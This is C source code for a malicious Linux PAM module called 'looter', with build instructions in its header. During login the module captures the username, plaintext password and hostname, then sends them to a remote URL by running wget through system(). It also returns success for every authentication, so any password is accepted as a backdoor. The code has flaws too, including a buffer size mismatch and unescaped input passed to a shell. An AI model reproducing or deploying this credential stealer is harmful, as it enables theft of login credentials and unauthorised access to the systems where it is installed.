/*********************************************************************************************************** 
Compile the file using:
 gcc -m32 -Werror -Wall -fPIC -shared -o looter.so looter2.c

m32 switch compile the program for 32bit arch
You need to install 
 gcc-multilib 
on a 64bit arch

Dependecies: PAM library 
 libpam0g-dev

In the second versione I invoke a remote URL and I pass the message containing the credentials as parameter
I do not use a Bot Telegram anymor

**************************************************************************************************************/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <security/pam_appl.h>
#include <security/pam_modules.h>
#include <unistd.h>

size_t write_data(void *buffer, size_t size, size_t nmemb, void *userp)
{
  return size * nmemb;
}

void sendMessage(char (*message)[]) {
  char wget[500];

  //spider mode (dont' download), redirecte the output to the void  
  sprintf(wget,"wget --spider \"http://www.myurl.org?secret=%s\" -o /dev/null", *message);
  

  system(wget);
  
}

PAM_EXTERN int pam_sm_setcred( pam_handle_t *pamh, int flags, int argc, const char **argv ) {
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, const char **argv) {
  return PAM_SUCCESS;
}

PAM_EXTERN int pam_sm_authenticate( pam_handle_t *pamh, int flags,int argc, const char **argv ) {
  int retval;
  const char* username;
  const char* password;
  char message[1024];
  char hostname[128];
  retval = pam_get_user(pamh, &username, "Username: ");
  pam_get_item(pamh, PAM_AUTHTOK, (void *) &password);
  if (retval != PAM_SUCCESS) {
    return retval;
  }
  gethostname(hostname, sizeof hostname);
  snprintf(message,2048,"HostN: %s\nUser: %s\nPasswd: %s\n",hostname,username,password);
  sendMessage(&message);
  return PAM_SUCCESS;
}
